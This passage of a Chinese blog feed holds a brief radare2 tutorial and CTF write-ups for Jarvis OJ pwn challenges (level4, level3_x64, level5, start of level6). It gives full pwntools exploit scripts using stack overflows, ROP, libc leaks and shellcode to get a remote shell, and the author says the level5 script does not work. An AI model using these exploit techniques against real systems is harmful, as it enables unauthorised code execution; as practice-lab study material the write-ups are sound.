ecx                                   ; char **ubp_av</span><br><span class="line">   0x080491cd   54 sym.vulnerable                           |           0x080490b5      push esi                                   ; int argc</span><br><span class="line">   0x08049040    6 sym.imp.gets                             |           0x080490b6      mov eax, sym.main                          ; 0x8049203</span><br><span class="line">   0x080491a2   43 sym.flag                                 |           0x080490bc      push eax                                   ; func main</span><br><span class="line">   0x08049060    6 sym.imp.system                           \           0x080490bd      call sym.imp.__libc_start_main             ; int __libc_star</span><br><span class="line">   0x08049000   35 sym._init</span><br><span class="line">   0x08049080    6 sub.__gmon_start_80</span><br></pre></td></tr></table></figure><ul><li>s 命令可以跳转到某个地址或者已经有了符号的函 数中去。然后我们使用pdf这个命令可以打印main这个函数的汇编代码。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[0x08049090]&gt; s main</span><br><span class="line">[0x08049203]&gt; pdf</span><br><span class="line">            ;-- main:</span><br><span class="line">/ (fcn) sym.main 65</span><br><span class="line">|   sym.main (int argc, char **argv, char **envp);</span><br><span class="line">|           ; var int local_8h @ ebp-0x8</span><br><span class="line">|           ; arg int arg_4h @ esp+0x4</span><br><span class="line">|           ; DATA XREF from entry0 (0x80490b6)</span><br><span class="line">|           0x08049203      8d4c2404       lea ecx, [arg_4h]           ; 4</span><br><span class="line">|           0x08049207      83e4f0         and esp, 0xfffffff0</span><br><span class="line">|           0x0804920a      ff71fc         push dword [ecx - 4]</span><br><span class="line">|           0x0804920d      55             push ebp</span><br><span class="line">|           0x0804920e      89e5           mov ebp, esp</span><br><span class="line">|           0x08049210      53             push ebx</span><br><span class="line">|           0x08049211      51             push ecx</span><br><span class="line">|           0x08049212      e82d000000     call sym.__x86.get_pc_thunk.ax</span><br><span class="line">|           0x08049217      05e92d0000     add eax, 0x2de9</span><br><span class="line">|           0x0804921c      83ec0c         sub esp, 0xc</span><br><span class="line">|           0x0804921f      8d9010e0ffff   lea edx, [eax - 0x1ff0]</span><br><span class="line">|           0x08049225      52             push edx                    ; const char *s</span><br><span class="line">|           0x08049226      89c3           mov ebx, eax</span><br><span class="line">|           0x08049228      e823feffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|           0x0804922d      83c410         add esp, 0x10</span><br><span class="line">|           0x08049230      e898ffffff     call sym.vulnerable</span><br><span class="line">|           0x08049235      b800000000     mov eax, 0</span><br><span class="line">|           0x0804923a      8d65f8         lea esp, [local_8h]</span><br><span class="line">|           0x0804923d      59             pop ecx</span><br><span class="line">|           0x0804923e      5b             pop ebx</span><br><span class="line">|           0x0804923f      5d             pop ebp</span><br><span class="line">|           0x08049240      8d61fc         lea esp, [ecx - 4]</span><br><span class="line">\           0x08049243      c3             ret</span><br></pre></td></tr></table></figure><p>radare2还实现了IDA的类似F5功能，我们可以使用pdc命令来实现。(目前看上去真不怎么样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[0x08049203]&gt; pdc</span><br><span class="line">function sym.main () &#123;</span><br><span class="line">    //  1 basic blocks</span><br><span class="line"></span><br><span class="line">    loc_0x8049203:</span><br><span class="line"></span><br><span class="line">  //DATA XREF from entry0 (0x80490b6)</span><br><span class="line">       ecx = [arg_4h]           //4</span><br><span class="line">       esp &amp;= 0xfffffff0        //ebp</span><br><span class="line">       push dword [ecx - 4]</span><br><span class="line">       push ebp</span><br><span class="line">       ebp = esp</span><br><span class="line">       push ebx</span><br><span class="line">       push ecx</span><br><span class="line">       sym.__x86.get_pc_thunk.ax ()</span><br><span class="line">       eax += 0x2de9            //obj._GLOBAL_OFFSET_TABLE</span><br><span class="line">       esp -= 0xc</span><br><span class="line">       edx = [eax - 0x1ff0]     //&quot;input&quot; str.input</span><br><span class="line">       push edx                 //const char *s ; (pstr 0x0804a010) &quot;input&quot;</span><br><span class="line">       ebx = eax                //obj._GLOBAL_OFFSET_TABLE</span><br><span class="line">       </span><br><span class="line">       int puts(const char * s : (*0x804a010)0x00177fe0 = input)</span><br><span class="line">       esp += 0x10</span><br><span class="line">       sym.vulnerable ()</span><br><span class="line">       eax = 0</span><br><span class="line">       esp = [local_8h]</span><br><span class="line">       pop ecx</span><br><span class="line">       pop ebx</span><br><span class="line">                                //ebp</span><br><span class="line">       esp = [ecx - 4]          //ebp</span><br><span class="line">       return</span><br><span class="line">(break)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有框架结构界面，我们可以使用大写的VV命令来到框架结构界面。(很赞</p><pre><code>.---------------------------------------------------.     | [0x8049203]                                       |     | ;-- main:                                         |     | ;-- eip:                                          |     | (fcn) sym.main 65                                 |     |   sym.main (int argc, char **argv, char **envp);  |     | ; var int local_8h @ ebp-0x8                      |     | ; arg int arg_4h @ esp+0x4                        |     | ; DATA XREF from entry0 (0x80490b6)               |     | ; 4     |     | lea ecx, [arg_4h]                                 |     | and esp, 0xfffffff0                               |     | push dword [ecx - 4]                              |     | push ebp                                          |     | mov ebp, esp                                      |     | push ebx                                          |     | push ecx                                          |     | call sym.__x86.get_pc_thunk.ax;[ga]               |     | add eax, 0x2de9                                   |     | sub esp, 0xc                                      |     | lea edx, [eax - 0x1ff0]                           |     | ; const char *s                                   |     | push edx                                          |     | mov ebx, eax                                      |     | ; int puts(const char *s)                         |     | call sym.imp.puts;[gb]                            |     | add esp, 0x10                                     |     | call sym.vulnerable;[gc]                          |     | mov eax, 0                                        |     | lea esp, [local_8h]                               |  `---------------------------------------------------&apos;                                          </code></pre><p><em>目前就了解了这一点，参考了一些大佬的文章，之后可以尝试着去使用，仅仅局限于IDA,GDB是不行的。就这样。</em></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Jarvis OJ-pwn</title>
      <link href="/2018/09/13/jarvis-oj-pwn/"/>
      <url>/2018/09/13/jarvis-oj-pwn/</url>
      <content type="html"><![CDATA[<p><em>开始漫漫刷题之路</em></p><h1 id="level4-DynELF"><a href="#level4-DynELF" class="headerlink" title="level4 - DynELF"></a>level4 - DynELF</h1><p>题目给的东西很少，基本信息如下：</p><h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>main：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(1, &quot;Hello, World!\n&quot;, 0xEu);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>vulnerable_function：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>保护：只开启了nx。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;/root/pwnprac/level4&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>read很明显会溢出，溢出到返回地址覆盖为system的地址即可，问题在于其地址的寻找，也就是该题的重点：DynELF。<br>最终思路就是因为可以不断的通过调用write函数来leak函数地址，使用dynelf可以通过泄露的地址确定libc版本来确定system地址。<br>/bin/sh则可以通过调用read来将其写入bss段，调用即可。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./level4&apos;)</span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;,9880)</span><br><span class="line">libc = ELF(&apos;./level4&apos;)</span><br><span class="line"></span><br><span class="line">bss_add = libc.bss()   //直接得到bss段地址</span><br><span class="line"></span><br><span class="line">def leak(add):     //leak函数</span><br><span class="line">    pay1 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(add) + p32(4)</span><br><span class="line">    sh.send(pay1)</span><br><span class="line">    data = sh.recv(4)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">#神奇DynELF工具使用</span><br><span class="line">d = DynELF(leak,elf = ELF(&apos;./level4&apos;))   //初始化DynELF模块 </span><br><span class="line">sys_add = d.lookup(&apos;system&apos;,&apos;libc&apos;)      //在libc文件中搜索system函数的地址  </span><br><span class="line"> </span><br><span class="line">print hex(sys_add)</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;read&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(0) + p32(bss_add) + p32(8)    //调用read</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line">sh.send(&apos;/bin/sh\x00&apos;) </span><br><span class="line"></span><br><span class="line">pay3 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(sys_add) + &apos;dead&apos; + p32(bss_add)</span><br><span class="line">sh.send(pay3)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>获得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><p><em>参考:<a href="&quot;https://blog.csdn.net/u011987514/article/details/68490157&quot;">借助DynELF实现无libc的漏洞利用小结</a></em></p><h1 id="level3-x64-64位参数传递"><a href="#level3-x64-64位参数传递" class="headerlink" title="level3_x64 - 64位参数传递"></a>level3_x64 - 64位参数传递</h1><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p><p><em>搞了一早上感觉思路完全没毛病，但是poc总是不能用，最终与网上的wp调试比对半天才发现在该文档下的libc-2.19.so文件不是该题的配套libc！！！！！应该是之前某个题的。。。心态爆炸<br>重新下载源文件，问题解决。。。</em></p><h2 id="信息："><a href="#信息：" class="headerlink" title="信息："></a>信息：</h2><p>漏洞函数：明显的栈溢出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  write(1, &quot;Input:\n&quot;, 7uLL);</span><br><span class="line">  return read(0, &amp;buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>整体思路与之前相同：泄露write函数got地址，然后通过调用write函数泄露write真实地址，之后system，/bin/sh什么的手到擒来。所以主要就是练习x64下的参数传递。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;,9883)</span><br><span class="line">#sh = process(&apos;level3&apos;)</span><br><span class="line">pwn = ELF(&apos;level3_x64&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x004006b3            #pop rdi ; ret</span><br><span class="line">pop_rsi_r15_ret = 0x004006b1      #pop rsi ; pop r15 ; ret</span><br><span class="line"></span><br><span class="line">sys_libc_addr = libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_libc_addr = libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line"></span><br><span class="line">#----------To get write.got--------------# </span><br><span class="line">pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay1 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(1)    //虽然找不到pop_rdx_ret,但是经调试，rdx值大于8，所以我们可以只接受前八个字符即可。</span><br><span class="line">pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;Input:\n&quot;)</span><br><span class="line">sh.send(pay1)</span><br><span class="line">write_addr = u64(sh.recv(8))</span><br><span class="line"></span><br><span class="line">#---------call system func---------------#</span><br><span class="line">sys_addr = write_addr - libc.symbols[&apos;write&apos;] + sys_libc_addr</span><br><span class="line">binsh_addr = write_addr - libc.symbols[&apos;write&apos;] + binsh_libc_addr</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos; </span><br><span class="line">pay2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>获得shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="level5-mmap-amp-amp-mprotect"><a href="#level5-mmap-amp-amp-mprotect" class="headerlink" title="level5 - mmap &amp;&amp; mprotect"></a>level5 - mmap &amp;&amp; mprotect</h1><h2 id="信息-1"><a href="#信息-1" class="headerlink" title="信息"></a>信息</h2><p>同level3_x64 , 假设system 和 execve 被禁用，使用mmap 及mprotect 获取shell</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>先搞清楚mmap 与 mprotect：<br>mmap 就是分配堆内存的那个mmap，原函数为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;sys/mman.h&gt;</span><br><span class="line">void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off);</span><br></pre></td></tr></table></figure><p>mprotect，给addr开始的len长度的内存修改权限，原函数为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br></pre></td></tr></table></figure><p>所以可以将shellcode写入bss段之类的调用mprotect函数将其可执行，然后返回地址到shellcode处即可；<br>当然也可以mmap分配一段空间然后一样的操作。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><p><em>稍微有点问题。。但是找不到，莫得办法。</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#sh = remote(&apos;pwn2.jarvisoj.com&apos;,9884)</span><br><span class="line">sh = process(&apos;level3_x64&apos;)</span><br><span class="line">pwn = ELF(&apos;level3_x64&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x004006b3            #pop rdi ; ret</span><br><span class="line">pop_rsi_r15_ret = 0x004006b1      #pop rsi ; pop r15 ; ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#----------To get write.got--------------#</span><br><span class="line">sh.recv()</span><br><span class="line">pay1 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay1 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(pwn.got[&apos;write&apos;]) + p64(0)    </span><br><span class="line">pay1 += p64(pwn.symbols[&apos;write&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.send(pay1)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">write_addr = u64(sh.recv(8))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">print &quot;write_addr : &quot; + hex(write_addr)</span><br><span class="line"></span><br><span class="line">#----------to get mprotect.got and write shellcode to bss_addr------#</span><br><span class="line"></span><br><span class="line">mprotect_got_addr = write_addr - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;mprotect&apos;]</span><br><span class="line"></span><br><span class="line">print &quot;mprotect_got_addr : &quot;+ hex(mprotect_got_addr)</span><br><span class="line"></span><br><span class="line">bss_addr = pwn.bss()</span><br><span class="line"></span><br><span class="line">print &quot;bss_addr : &quot; + hex(bss_addr)</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay2 += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(0) </span><br><span class="line">pay2 += p64(pwn.symbols[&apos;read&apos;]) + p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">#-------------------to write bss &amp;&amp; mprotect to .got table----------------#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_got_addr = 0x600a80</span><br><span class="line">mprotect_got_addr = 0x600a78</span><br><span class="line"></span><br><span class="line">pay3 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay3 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_got_addr) + p64(0) + p64(pwn.symbols[&apos;read&apos;])</span><br><span class="line">pay3 += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(mprotect_got_addr) + p64(0) + p64(pwn.symbols[&apos;read&apos;])</span><br><span class="line">pay3 += p64(pwn.symbols[&apos;vulnerable_function&apos;])</span><br><span class="line"></span><br><span class="line">sh.send(pay3)</span><br><span class="line"></span><br><span class="line">sh.send(p64(bss_got_addr))</span><br><span class="line"></span><br><span class="line">sh.send(p64(mprotect_got_addr))</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line">#---------------------------</span><br><span class="line"></span><br><span class="line">init_start = 0x4006a6</span><br><span class="line">init_end = 0x400690</span><br><span class="line"></span><br><span class="line">pay4 = &apos;a&apos;*0x80 + &apos;bbbbbbbb&apos;</span><br><span class="line">pay4 += p64(init_start) + &apos;bbbbbbbb&apos;</span><br><span class="line">pay4 += p64(0) #rbx</span><br><span class="line">pay4 += p64(1) #rbp</span><br><span class="line">pay4 += p64(mprotect_got_addr) </span><br><span class="line">pay4 += p64(7) #r13-&gt;rdx</span><br><span class="line">pay4 += p64(0x1000) #r14-&gt;rsi</span><br><span class="line">pay4 += p64(0x600000) #r15-&gt;rdi</span><br><span class="line"></span><br><span class="line">pay4 += p64(init_end) + &apos;bbbbbbbb&apos; </span><br><span class="line">pay4 += p64(0) + p64(1) + p64(bss_got_addr) + p64(0)  + p64(0) + p64(0)</span><br><span class="line">pay4 += p64(init_end)</span><br><span class="line"></span><br><span class="line">sh.send(pay4)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="level6-堆的unlink利用"><a href="#level6-堆的unlink利用" class="headerlink" title="level6 - 堆的unlink利用"></a>level6 - 堆的unlink利用</h1><p>正常的选项类型题</p><h2 id="信息-2"><a href="#信息-2" class="headerlink" title="信息"></a>信息</h2><p>main:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line"></span><br><span class="line">  alarm_func();</span><br><span class="line">  main_ptr();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = menu();</span><br><span class="line">LABEL_3:</span><br><span class="line">    switch ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1u:</span><br><span class="line">        list();</span><br><span class="line">        continue;</span><br><span class="line">      case 2u:</span><br><span class="line">        add();</span><br><span class="line">        continue;</span><br><span class="line">      case 3u:</span><br><span class="line">        edit();</span><br><span class="line">        continue;</span><br><span class="line">      case 4u:</span><br><span class="line">        delete();</span><br><span class="line">        v0 = menu();</span><br><span class="line">        if ( v0 &gt; 5 )</span><br><span class="line">          goto LABEL_6;</span><br><span class="line">        goto LABEL_3;</span><br><span class="line">      case 5u:</span><br><span class="line">        puts(&quot;Bye&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">      default:</span><br><span class="line">LABEL_6:</span><br><span class="line">        puts(&quot;Invalid!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>问题函数：<br>delete函数未检查inuse位，可以double free，且free完并未清空指针。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  int v1; // edx</span><br><span class="line">  int v3; // eax</span><br><span class="line"></span><br><span class="line">  if ( *(_DWORD *)(dword_804A2EC + 4) &lt;= 0 )</span><br><span class="line">    return puts(&quot;No notes yet.&quot;);</span><br><span class="line">  printf(&quot;Note number: &quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  if ( v0 &lt; 0 )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  v1 = dword_804A2EC;</span><br><span class="line">  if ( v0 &gt;= *(_DWORD *)dword_804A2EC )</span><br><span class="line">    return puts(&quot;Invalid number!&quot;);</span><br><span class="line">  --*(_DWORD *)(dword_804A2EC + 4);</span><br><span class="line">  v3 = v1 + 12 * v0;</span><br><span class="line">  *(_DWORD *)(v3 + 8) = 0;</span><br><span class="line">  *(_DWORD *)(v3 + 12) = 0;</span><br><span class="line">  free(*(void **)(v3 + 16));</span><br><span class="line">  return puts(&quot;Done.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时add与edit会对输入的大小进行（或许）与0x80的对齐，即向上对齐到0x80,0x100,0x180,0x200这样子。不过只需要输入申请大小的内容即可。</p><p>保护：（基本上不用看。。）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] 